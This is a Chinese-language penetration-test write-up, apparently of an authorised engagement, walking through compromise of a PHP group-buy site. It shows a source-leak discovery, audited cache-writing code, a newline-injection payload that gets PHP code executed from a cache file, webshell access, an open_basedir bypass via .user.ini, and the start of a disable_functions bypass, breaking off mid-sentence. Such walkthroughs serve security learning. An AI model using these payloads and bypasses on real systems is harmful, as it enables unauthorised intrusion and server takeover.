一 前言

这几天，一起和同事做一个授权的网站的溯源调查跟踪，并最终拿下服务器，整个过程是比较有意思的，事后我把整个过程脱敏之后写出来供大家一起学习参考。

二、探测

接受网址后，首先进行一些踩点摸索，首先看到是一个夺宝拼团类的网站。

利用谷歌开发者工具看到了这是一个开发语言为PHP的网站，再查看网站源代码之后，查看到网站的路由，基本判定是一种基于Thinkphp的二次开发的网站。可以看到有 /public/runtime 这种Web目录，还有网站的路由也是 index.php?ctl=file&act=upload ，一般ctl表示控制器， act 表示执行这个控制器中的具体的动作。

在根据网站的命名习惯之后，定制化了一个字典，利用 dirsearch 这种目录扫描工具，扫到了一个 install/fw.zip 压缩文件，下载之后发现是网站的源码，在使用常规手段没有啥进展之后，进入了代码审计过程。

3.3 找缓存文件名

利用点是找到了，但是还有个问题，那么这里的缓存文件名怎么找呢？我们需要继续追踪一下 $GLOBALS['cache']->set($key,$consignee_data); 中的 set 方法。

在 system/cache/CacheFileService.php 中

 public function set($name,$value,$expire ="-1")
    {

     if(IS_DEBUG)return false;
     if($expire=='-1') $expire = 3600*24;
        $filename   =   $this->filename($name,true);
       
        $data   =   serialize($value);   
        $data    = "<?php\n//".sprintf('%012d',$expire).$check.$data."\n?>";        
     $rs = @file_put_contents($filename,$data);
     if($rs)
        return true;
        else
        return false;
    }

可以看到最后的数据会经过序列化然后存入到 $filename 定义的变量路径中，那么继续追溯一下 filename()这个类方法，

    private function filename($name,$mdir=false)
    {
        $name = md5($name);
        $filename =  $name.'.php';
       
      $hash_dir = $this->dir . 'c' . substr(md5($name), 0, 1)."/";
      if ($mdir&&!is_dir($hash_dir))
        {
             @mkdir($hash_dir);
             @chmod($hash_dir, 0777);
        }        
     $hash_dir = $hash_dir . 'c' . substr(md5($name), 1, 1)."/";
      if ($mdir&&!is_dir($hash_dir))
        {
             @mkdir($hash_dir);
             @chmod($hash_dir, 0777);
        }
        return $hash_dir.$this->prefix.$filename;
    }

是将传入的 $name 变量进行md5，然后一些字符串处理，生成二级目录，我们这里直接拷贝出来单独生成就行。

上面也说了 $key 变量非常关键，我们正常debug，在 $key = $this->build_key(__CLASS__,$param); 这行代码下面写上 echo $key;exit(); (我习惯这么调试) 得出 key 为CONSIGNEE_INFO_AUTO_CACHE_19, 然后把filename 方法拷贝编写一个获取缓存路径的脚本我这边命名为test.php

<?php

 function filename($name,$mdir=false)
{
    $dir = "/";
    $name = md5($name);
    $filename =  $name.'.php';

    $hash_dir = $dir . 'c' . substr(md5($name), 0, 1)."/";

}
echo filename("CONSIGNEE_INFO_AUTO_CACHE_19", true); 

记得把这里的 $this->dir 类成员变量换成局部变量，并自己赋值，然后直接输出.

这样就得到缓存文件名了。

3.4 payload

上面可以看到我们的缓存内容是一个序列化后的文本，那么我们该如何插入我们的payload的呢？其实就一句话 利用换行符和注释来突破序列化问题, 在Http请求中，%0A%0D是换行符的编码，我们可以在前后插入换行符来利用。

比如，缓存文件中的内容为：

<?php
//00a:1:{s:12:"sina_app_key"}
?>

而sina_app_key这个文本是我们可控的内容,那我们可以输入

%0A%0Dphpinfo();%0A%0D//

那么文件中会变成什么样子呢？

<?php
//a:1:{s:12:"
phpinfo();
//"}
?>

可以看到这里的 phpinfo() 已经高亮了，说明可以正常解析了。

那么我们的payload就是

%0A%0Dphpinfo();%0A%0D//

五、提权

5.1 open_basedir?

拿到Webshell，第一时间看看有什么文件，但是发现无法跨目录，向上没有权限，宝塔嘛，默认就会设置open_basedir ，

突破 open_basedir 有手就行。

在网站的任意的一个目录下，新建一个 .user.ini ，里面内容写上

open_basedir=/

然后把shell复制到这个目录下然后重新连接，突破。原理是nginx会首先匹配当前目录下是否有.user.ini，如果有优先加载当前目录下的.user.ini。

但是翻了下文件，还是没有可利用价值的，还是需要提权。

5.2 突破disable_functions

宝塔，你懂的，disable_functions 肯定是被限制的死死的。

所有被禁止的函数如下：

passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv

好了，我们现在是一个低权限的用户www，而且没有执行命令的权限。

看了下phpinfo，php程序是php-fpm+fastcgi来启动的。那么还记得PHITHON 师傅写过的文章：Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写 ,地址是：https://www.leavesongs.com/penetration/fastcgi-and-php-fpm.html

蚁剑也有这样的插件，正常情况下是可以利用的。

但是这里执行失败了，无语，开始找问题，配合PHITHON的文章看了下这蚁剑插件的源码，在 antSword-master/antData/plugins/as_bypass_php_disable_functions-master 这个目录下，就是绕过disable_functions插件的这个源代码，官方的地址是：https://github.com/Medicean/as_bypass_php_disable_functions，在https://github.com/Medicean/as_bypass_php_disable_functions/blob/master/core/php_fpm/index.js 第192行，
